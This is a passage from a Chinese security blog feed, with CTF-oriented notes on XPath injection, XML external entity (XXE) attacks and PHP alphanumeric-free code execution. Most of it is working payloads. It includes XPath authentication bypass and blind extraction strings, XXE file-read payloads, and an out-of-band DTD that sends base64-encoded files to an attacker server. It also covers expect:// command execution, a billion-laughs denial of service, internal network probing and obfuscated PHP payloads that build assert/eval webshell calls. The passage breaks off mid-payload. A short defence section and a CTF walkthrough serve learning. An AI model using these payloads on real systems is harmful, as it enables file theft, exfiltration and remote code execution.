tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><strong>index.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml&#x3D;simplexml_load_file(&#39;index.xml&#39;);$name&#x3D;$_GET[&#39;name&#39;];$pwd&#x3D;$_GET[&#39;pwd&#39;];$query&#x3D;&quot;&#x2F;root&#x2F;users&#x2F;user[username&#x2F;text()&#x3D;&#39;&quot;.$name.&quot;&#39; and password&#x2F;text()&#x3D;&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result&#x3D;$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;&#x2F;h2&gt;&#39;;    foreach($result as $key&#x3D;&gt;$value)&#123;        echo &#39;&lt;br &#x2F;&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br &#x2F;&gt;Username:&#39;.$value-&gt;username;    &#125;&#125;?&gt;</code></pre><h4 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h4><p><strong>payload</strong></p><p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>，结果如下，类似sql注入，绕过了xml查询</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>payload</strong></p><p>有返回结果则为正确</p><pre class="language-xml" data-language="xml"><code class="language-xml">推测根节点数，有返回结果则说明只有一个根节点' or count(/*) = 1 or '1' = '2  猜解一级节点' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  ' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  ......推测root的下一级节点数' or count(/root/*) = 1 or '1' = '2猜解root的下一级节点' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2......猜解节点中的数据' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  ' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  ......</code></pre><ul><li><code>/ ：</code>从根节点选取</li><li><code>// ：</code>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</li><li><code>. ：</code>选取当前节点</li><li><code>.. ：</code>选取当前节点的父节点</li></ul><h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><blockquote><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><blockquote><p>XXE的造成与PHP版本无关，与libxml库的版本有关。libxml &lt;= 2.9.0中，默认启用了外部实体，libxml&gt;2.9.0中默认仅用了外部实体。XXE并不是直接由libxml库造成的，libxml库提供了一些XML核心功能，包括禁用外部实体的libxml_disable_entity_loader()函数，SimpleXML库提供了解析XML的函数，SimpleXML库依赖于libxml库。</p></blockquote><p>本地测试环境php.4.45   libxml = 2.7.8</p><p>外部实体可支持http、file等协议。不同程序支持的协议不同</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);print_r($xml);?&gt;</code></pre><p><strong>payload</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "file:///d://flag.txt" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>url编码后给传入，即在 xml 中 <code>&amp;file ;</code> 变成了外部文件<code>qwzf.txt</code>中内容，导致敏感信息泄露。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);&#x2F;&#x2F; print_r($xml);?&gt;</code></pre><p>这种情况就需要将数据发送到远程服务器(攻击服务器)</p><p><strong>payload</strong></p><p><strong>传入的xml</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE test[&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;%send;]></span>另一种方式<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE root[    &lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">    %dtd;]></span></code></pre><p><strong>远程服务器的xxe.dtd文件</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">%payload;另一种方式：&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">%int;%send;</code></pre><p>将xml进行url编码后传入</p><p>再查看远程服务器的apache日志文件</p><p><code>cat /var/log/apache2/access.log</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p><p><code>nc -lvp 5000</code>  端口监听</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p><p>解码后即是文件的内容</p><p>攻击流程</p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "expect://id" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>通过XXE可以实现RCE的实例很少。</p><h4 id="拒绝服务攻击-Dos"><a href="#拒绝服务攻击-Dos" class="headerlink" title="拒绝服务攻击(Dos)"></a>拒绝服务攻击(Dos)</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   <span class="token doctype">&lt;!DOCTYPE lolz [&lt;!ENTITY lol "lol">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;">]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><p>php:</p><pre class="language-php" data-language="php"><code class="language-php">libxml_disable_entity_loader(true);</code></pre><p>java:</p><pre class="language-java" data-language="java"><code class="language-java">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre><p>Python:</p><pre class="language-python" data-language="python"><code class="language-python">from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</code></pre><p><strong>过滤用户提交的XML数据</strong></p><p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p><p><strong>不允许XML中含有自己定义的DTD</strong></p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE学习笔记/image-20200817204320669.png" style="zoom:80%;" loading="lazy"><p>题目提示<code>xml</code>，推测是<code>xxe</code>，于是<code>login</code>抓包，发现提交<code>username</code>和<code>password</code>是以一个<code>xml</code>格式的数据提交的，如下：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>于是进行<code>xxe</code>注入测试：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "file:///etc/passwd" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>回显<code>/etc/passwd</code>的内容，存在<code>xxe</code>注入，尝试读取文件，得到<code>doLogin.php</code>的代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*** autor: c0ny1* date: 2018-2-7*&#x2F;$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;账号$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;密码$result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123;    $dom &#x3D; new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds &#x3D; simplexml_import_dom($dom);    $username &#x3D; $creds-&gt;username;    $password &#x3D; $creds-&gt;password;    if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;        $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);    &#125;else&#123;        $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);    &#125;    &#125;catch(Exception $e)&#123;    $result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt;</code></pre><p>测试读取<code>flag</code>，硬是没找到，无法命令执行，网上找了找<code>wp</code>，放心居然是内网探测，读取<code>/etc/hosts</code>的文件，读到本机<code>ip</code>地址<code>173.56.110.9</code>，于是探测子网：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "http://173.56.110.11" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p><code>173.56.110.11</code>，返回flag</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a></li><li><a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></li><li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXE知识总结</a></li><li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXE漏洞学习</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
            <tag> xxe </tag>
            
            <tag> xpath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP无字母数字RCE</title>
      <link href="/posts/a268445b/"/>
      <url>/posts/a268445b/</url>
      
        <content type="html"><![CDATA[<p>CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p><a id="more"></a><p>测试代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;exp&#39;])) &#123;          eval($_GET[&#39;exp&#39;]);    &#125;</code></pre><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">echo urlencode(~&#39;exp&#39;);</code></pre><p>payload</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); (~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();echo urlencode(~&#39;assert&#39;);echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 跑出非字母数字异或得到的 $str$str &#x3D; &#39;GET&#39;;$exp1 &#x3D; &#39;&#39;;$exp2 &#x3D; &#39;&#39;;for ($k &#x3D; 0; $k &lt; strlen($str); $k++) &#123;    $flag &#x3D; 0;    for ($i &#x3D; 0; $i &lt; 128; $i++) &#123;        if (($i &gt;&#x3D; 48 &amp;&amp; $i &lt;&#x3D; 57) || ($i &gt;&#x3D; 65 &amp;&amp; $i &lt;&#x3D; 90) || ($i &gt;&#x3D; 97 &amp;&amp; $i &lt;&#x3D; 122)) &#123;            continue;        &#125;        for ($j &#x3D; 0; $j &lt; 128; $j++) &#123;            if (($j &gt;&#x3D; 48 &amp;&amp; $j &lt;&#x3D; 57) || ($j &gt;&#x3D; 65 &amp;&amp; $j &lt;&#x3D; 90) || ($j &gt;&#x3D; 97 &amp;&amp; $j &lt;&#x3D; 122)) &#123;                continue;            &#125;            if ((chr($i) ^ chr($j)) &#x3D;&#x3D;&#x3D; $str[$k]) &#123;                $exp1 &#x3D; $exp1.urlencode(chr($i));                $exp2 &#x3D; $exp2.urlencode(chr($j));                $flag &#x3D; 1;                break;            &#125;        &#125;        if($flag &#x3D;&#x3D;&#x3D; 1)&#123;            break;        &#125;    &#125;&#125;echo $exp1.&#39;^&#39;.$exp2.&quot;\n&quot;;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo&#x3D;&#x3D;&gt;  phpinfo()$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])&#x3D;&#x3D;&gt;  assert(&quot;eval($_POST[&#39;a&#39;])&quot;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$_&#x3D;[].[]; &#x2F;&#x2F;俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray$__&#x3D;&#39;&#39;;  &#x2F;&#x2F;两个短杠赋值为空$_&#x3D;$_[&#39;&#39;];&#x2F;&#x2F;从arrayarray中取首字符，即a。这里$_&#x3D;$_[0]也是一样的道理，不过waf限制数字输入$_&#x3D;++$_; &#x2F;&#x2F;b$_&#x3D;++$_; &#x2F;&#x2F;c$_&#x3D;++$_; &#x2F;&#x2F;d$_&#x3D;++$_; &#x2F;&#x2F;e$__.&#x3D;$_; &#x2F;&#x2F;E  把两个短杠赋值为E$_&#x3D;++$_; &#x2F;&#x2F;F  一个短杠继续自增$_&#x3D;++$_; &#x2F;&#x2F;G $__&#x3D;$_.$__; &#x2F;&#x2F; GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE$_&#x3D;++$_; &#x2F;&#x2F;H 此处一个短杠继续自增，为H$_&#x3D;++$_; &#x2F;&#x2F;I$_&#x3D;++$_; &#x2F;&#x2F;J$_&#x3D;++$_; &#x2F;&#x2F;k$_&#x3D;++$_; &#x2F;&#x2F;L$_&#x3D;++$_; &#x2F;&#x2F;M$_&#x3D;++$_; &#x2F;&#x2F;N$_&#x3D;++$_; &#x2F;&#x2F;O$_&#x3D;++$_; &#x2F;&#x2F;P$_&#x3D;++$_; &#x2F;&#x2F;Q$_&#x3D;++$_; &#x2F;&#x2F;R$_&#x3D;++$_; &#x2F;&#x2F;S$_&#x3D;++$_; &#x2F;&#x2F;T$__.&#x3D;$_; &#x2F;&#x2F; GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.&#x3D;拼接，构成get$&#123;&#39;_&#39;.$__&#125;[_]($&#123;&#39;_&#39;.$__&#125;[__]); &#x2F;&#x2F; 进行拼接，$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]);url编码后：%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);url编码后：%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%